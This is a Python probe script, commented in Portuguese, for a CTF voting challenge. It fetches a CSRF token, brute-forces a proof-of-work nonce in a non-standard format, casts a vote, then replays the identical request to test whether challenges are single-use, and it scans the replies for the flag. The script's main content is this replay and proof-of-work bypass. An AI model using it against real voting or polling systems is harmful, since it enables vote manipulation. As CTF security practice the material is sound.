#!/usr/bin/env python3
"""Probe do desafio 'Uma Ideia para o IDEA' (IDP CTF).
Testa: (1) o servidor valida o formato do nonce? (2) o challenge e de uso unico?
Faz 1 voto real na proposta escolhida + 1 replay, e reporta tudo.
Nao faz loop grande: so recon do comportamento do servidor.
Uso: python3 probe.py http://<HOST>:45804 4
"""
import sys, re, hashlib, json, itertools
import urllib.request, urllib.error, http.cookiejar

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://<HOST>:45804"
PID  = sys.argv[2] if len(sys.argv) > 2 else "4"
FLAG = re.compile(r"IDP\{[^}]+\}")

def mk_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(op, path):
    r = op.open(BASE + path, timeout=15)
    return r.status, r.read().decode("utf-8", "replace")

def post_json(op, path, obj):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(BASE + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = op.open(req, timeout=15)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def csrf_of(html):
    m = re.search(r'name="csrf-token" content="([^"]+)"', html)
    return m.group(1) if m else None

def count_of(html, pid):
    m = re.search(r'data-proposal-id="%s".*?<strong>\s*([0-9]+)\s*/' % re.escape(pid), html, re.S)
    return m.group(1) if m else "?"

def solve(prefix, limit=60_000_000):
    """Busca ILIMITADA: nonce = inteiro cru (NAO o formato IDP-CTF do cliente)."""
    pre = "urna-aberta:v1:"
    for i in itertools.count():
        if i > limit:
            return None, i
        n = str(i)
        if hashlib.sha256((pre + n).encode()).hexdigest().startswith(prefix):
            return n, i

def hunt(txt, tag):
    m = FLAG.search(txt)
    if m:
        print("\n>>> FLAG ENCONTRADA (%s): %s\n" % (tag, m.group(0)))

op = mk_opener()
st, home = get(op, "/")
csrf = csrf_of(home)
print("GET /            -> %s  csrf=%s  count(prop %s)=%s" % (st, csrf, PID, count_of(home, PID)))

st, ch = get(op, "/api/pow/challenge")
chal = json.loads(ch)
print("GET /challenge   -> %s  %s" % (st, ch))

print("resolvendo PoW (nonce arbitrario, prefix=%s)..." % chal["prefix"])
nonce, tries = solve(chal["prefix"])
print("  nonce=%s  tentativas=%s" % (nonce, tries))
if nonce is None:
    sys.exit("PoW nao resolvido dentro do limite.")

body = {"csrf": csrf, "challenge": chal["challenge"], "nonce": nonce, "proposal_id": PID}
st, v1 = post_json(op, "/api/votes", body)
print("\nVOTO 1 /api/votes-> %s  %s" % (st, v1)); hunt(v1, "voto1")

# replay: MESMO body de novo (testa reuso de challenge / dedup)
st, v2 = post_json(op, "/api/votes", body)
print("REPLAY /api/votes-> %s  %s" % (st, v2)); hunt(v2, "replay")

# recontar
st, home2 = get(op, "/")
print("\nGET / (depois)   -> count(prop %s)=%s" % (PID, count_of(home2, PID)))
hunt(home2, "home")
